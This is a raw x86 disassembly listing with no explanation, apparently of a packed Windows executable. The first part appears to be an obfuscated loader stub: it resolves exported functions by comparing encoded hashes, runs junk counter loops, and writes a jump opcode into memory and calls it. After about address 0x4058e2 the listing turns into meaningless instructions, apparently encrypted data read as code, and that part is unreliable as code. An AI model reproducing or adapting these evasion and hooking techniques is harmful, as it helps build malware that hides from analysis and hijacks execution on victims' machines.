  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR [eax+0x56],eax
  4058f0:	out    0xde,eax
  4058f2:	xor    al,0x5f
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	mov    ebp,0x24d5e8d0
  4058ff:	fadd   st,st(1)
  405901:	pop    esp
  405902:	ja     0x4058b7
  405904:	pusha  
  405905:	hlt    
  405906:	jg     0x405934
  405908:	pop    ss
  405909:	daa    
  40590a:	sub    ecx,ebp
  40590c:	stos   DWORD PTR es:[edi],eax
  40590d:	inc    ebx
  40590e:	mov    ss,eax
  405910:	jbe    0x405924
  405912:	pop    ds
  405913:	jl     0x40591e
  405915:	iret   
  405916:	mov    ebp,0x137b8a63
  40591b:	add    eax,DWORD PTR [ebx]
  40591d:	mov    BYTE PTR [ecx],dh
  40591f:	xlat   BYTE PTR ds:[ebx]
  405920:	push   edx
  405921:	sub    bh,ah
  405923:	les    ebp,FWORD PTR [edi]
  405925:	push   0x7515ae49
  40592a:	push   ds
  40592b:	es es add al,0xd8
  40592f:	pop    ds
  405930:	mov    cl,0x12
  405932:	mov    ds:0x45f9a68d,al
  405937:	or     BYTE PTR [eax-0x69],dl
  40593a:	sub    eax,0x856765bc
  40593f:	and    DWORD PTR [ebp-0x73455b18],0x17
  405946:	jmp    0x1763:0x45c7dd2f
  40594d:	jns    0x40593b
  40594f:	inc    ebp
  405950:	and    edi,esp
  405952:	out    dx,eax
  405953:	fptan  
  405955:	stos   BYTE PTR es:[edi],al
  405956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405957:	or     ebx,DWORD PTR [ecx+0x32]
  40595a:	(bad)  
  40595b:	dec    esp
  40595c:	jg     0x40595a
  40595e:	aas    
  40595f:	std    
  405960:	or     al,0x56
  405962:	retf   0xca06
  405965:	or     cl,bh
  405967:	mov    fs,WORD PTR [ebx-0x72]
  40596a:	xchg   edx,eax
  40596b:	mov    ecx,0x631edd8c
  405970:	xchg   edx,eax
  405971:	push   ebx
  405972:	xchg   esp,eax
  405973:	or     BYTE PTR [eax-0x3de36242],bl
  405979:	jmp    0x59b7:0xf6f3b9e9
  405980:	ins    DWORD PTR es:[edi],dx
  405981:	cmp    ah,dh
  405983:	clc    
  405984:	dec    esp
  405985:	and    al,BYTE PTR [ebx-0x56]
  405988:	retf   0x1c35
  40598b:	sti    
  40598c:	push   edx
  40598d:	push   edi
  40598e:	add    DWORD PTR [esi],ecx
  405990:	mov    eax,ds:0xe2bd2580
  405995:	push   esi
  405996:	sar    BYTE PTR [ebx-0x5aba86cd],cl
  40599c:	xor    ch,BYTE PTR [ebx-0x211a430f]
  4059a2:	scas   al,BYTE PTR es:[edi]
  4059a3:	enter  0x934e,0x3d
  4059a7:	jae    0x405972
  4059a9:	mov    ecx,0x30c76b35
  4059ae:	int3   
  4059af:	jne    0x405a2c
  4059b1:	xor    esp,DWORD PTR [esi+edi*4-0x2f7ce3c]
  4059b8:	mov    esp,0x73cad5c8
  4059bd:	cmp    DWORD PTR [ebx-0x26fd6aa2],edx
  4059c3:	inc    esi
  4059c4:	adc    al,0xad
  4059c6:	xlat   BYTE PTR ds:[ebx]
  4059c7:	test   BYTE PTR [ebp+0x15],bl
  4059ca:	in     al,0x45
  4059cc:	repnz loop 0x4059cf
  4059cf:	retf   0xc2ac
  4059d2:	sbb    DWORD PTR [esi+edx*2+0x60bfd3a5],0xffffffca
  4059da:	sti    
  4059db:	inc    esi
  4059dc:	pop    ebx
  4059dd:	mov    ebx,es
  4059df:	push   cs
  4059e0:	push   esp
  4059e1:	retf   
  4059e2:	sahf   
  4059e3:	jae    0x405a42
  4059e5:	cmp    cl,ch
  4059e7:	in     al,dx
  4059e8:	repz jnp 0x4059fb
  4059eb:	js     0x405a1d
  4059ed:	call   0x841ce343
  4059f2:	hlt    
  4059f3:	jmp    FWORD PTR [esi+edi*4-0x144d5564]
  4059fa:	mov    cl,0xc8
  4059fc:	(bad)  
  4059fd:	jbe    0x4059b6
  4059ff:	or     al,0x32
  405a01:	faddp  st(2),st
  405a03:	pop    edi
  405a04:	push   0xbd507cb
  405a09:	and    al,0x45
  405a0b:	push   ecx
  405a0c:	lds    eax,FWORD PTR [edi+0x4]
  405a0f:	push   ecx
  405a10:	mov    WORD PTR [ebp-0x73b3b2c7],cs
  405a16:	nop
  405a17:	inc    edi
  405a18:	or     bh,BYTE PTR [ebp-0x71]
  405a1b:	stos   BYTE PTR es:[edi],al
  405a1c:	cli    
  405a1d:	dec    edi
  405a1e:	loope  0x405a0b
  405a20:	inc    ebp
  405a21:	ret    0xc37b
  405a24:	and    eax,0xc5ba5e2d
  405a29:	rol    DWORD PTR [ecx],1
  405a2b:	xor    ebx,edx
  405a2d:	je     0x405a76
  405a2f:	push   0x96660361
  405a34:	mov    DWORD PTR [eax],0x98f521d
  405a3a:	and    BYTE PTR [esi],bh
  405a3c:	ret    
  405a3d:	fldenv [esi]
  405a3f:	je     0x405a88
  405a41:	cli    
  405a42:	xor    DWORD PTR [ecx],0x3e
  405a45:	aad    0x12
  405a47:	lods   eax,DWORD PTR ds:[esi]
  405a48:	or     edx,DWORD PTR [ebp+0x2c260b4]
  405a4e:	lds    eax,FWORD PTR [ebx]
  405a50:	iret   
  405a51:	mov    al,ds:0x620f1951
  405a56:	dec    ebp
  405a57:	mov    edx,0x27561527
  405a5c:	fmul   DWORD PTR [edi+0x109ae57c]
  405a62:	and    DWORD PTR [ebx-0x1f],eax
  405a65:	xchg   bh,ch
  405a67:	pushf  
  405a68:	pop    edi
  405a69:	iret   
  405a6a:	push   esp
  405a6b:	mov    dh,0x25
  405a6d:	loopne 0x405a47
  405a6f:	sub    BYTE PTR [ebx+edx*2],0xb8
  405a73:	dec    ebx
  405a74:	mov    ch,0xb7
  405a76:	dec    eax
  405a77:	js     0x405a8a
  405a79:	or     al,0xc
  405a7b:	mov    ah,0xc2
  405a7d:	ret    
  405a7e:	cld    
  405a7f:	pushf  
  405a80:	retf   
  405a81:	aam    0x2c
  405a83:	daa    
  405a84:	mov    al,0x12
  405a86:	cld    
  405a87:	jle    0x405ac1
  405a89:	rcl    BYTE PTR [edi+0x33f29dd2],cl
  405a8f:	or     BYTE PTR [ebp+0x406cca52],al
  405a95:	loop   0x405a39
  405a97:	in     al,dx
  405a98:	(bad)  
  405a99:	int    0xe5
  405a9b:	shl    BYTE PTR [edi-0x64],cl
  405a9e:	mov    ah,bl
  405aa0:	stos   DWORD PTR es:[edi],eax
  405aa1:	inc    esp
  405aa2:	mov    dh,0xd6
  405aa4:	call   0xddadd6e1
  405aa9:	pop    ebp
  405aaa:	imul   edx,esp,0x62
  405aad:	gs scas al,BYTE PTR es:[edi]
  405aaf:	add    al,0x61
  405ab1:	xchg   ebx,eax
  405ab2:	inc    eax
  405ab3:	in     eax,dx
  405ab4:	ss pop esp
  405ab6:	adc    esi,DWORD PTR [ebx-0x57098ab9]
  405abc:	xchg   esp,eax
  405abd:	mov    esp,?
  405abf:	push   ebx
  405ac0:	cmp    cl,BYTE PTR [ecx]
  405ac2:	fmulp  st(5),st
  405ac4:	push   ebp
  405ac5:	push   0x47
  405ac7:	or     DWORD PTR [ecx],esi
  405ac9:	mov    dl,0xa8
  405acb:	or     al,0xf0
  405acd:	fnstsw WORD PTR ds:0x4bbca9fe
  405ad3:	fwait
  405ad4:	pop    esi
  405ad5:	mov    edx,0x6504247a
  405ada:	test   eax,0x64604ed2
  405adf:	fsub   QWORD PTR [edi]
  405ae1:	lea    edi,[edx+0x4eb4aeb9]
  405ae7:	xor    al,0xfe
  405ae9:	mov    ah,BYTE PTR [ebx+0x25c5c136]
  405aef:	jl     0x405b56
  405af1:	inc    ebx
  405af2:	inc    edx
  405af3:	xchg   edx,eax
  405af4:	pusha  
  405af5:	test   ch,bl
  405af7:	and    DWORD PTR [esi],ebp
  405af9:	iret   
  405afa:	xchg   edi,eax
  405afb:	jg     0x405b62
  405afd:	cmp    DWORD PTR [ebp+ecx*1-0x19],0x37e8afd4
  405b05:	shl    BYTE PTR [esp+eiz*4],0xfe
  405b09:	push   0x5f
  405b0b:	cmp    eax,DWORD PTR [esp+ecx*8]
  405b0e:	sar    DWORD PTR [edi+0x63],0xb2
  405b12:	test   al,0xa9
  405b14:	mov    esi,0x28ac5721
  405b19:	mov    esp,0x950fdb1c
  405b1e:	xchg   edi,eax
  405b1f:	xchg   esi,eax
  405b20:	xchg   BYTE PTR [ebp-0x15],dh
  405b23:	push   ebp
  405b24:	sbb    dl,BYTE PTR [ebx+0x34]
  405b27:	xchg   edi,eax
  405b28:	jg     0x405ba5
  405b2a:	sbb    ebp,DWORD PTR [edx]
  405b2c:	sub    BYTE PTR [esi-0x76],cl
  405b2f:	pop    esi
  405b30:	lahf   
  405b31:	jge    0x405b44
  405b33:	pop    esp
  405b34:	retf   0xadbf
  405b37:	into   
  405b38:	imul   eax,DWORD PTR [ebx-0x43],0x9256b224
  405b3f:	adc    eax,0x9fd59b85
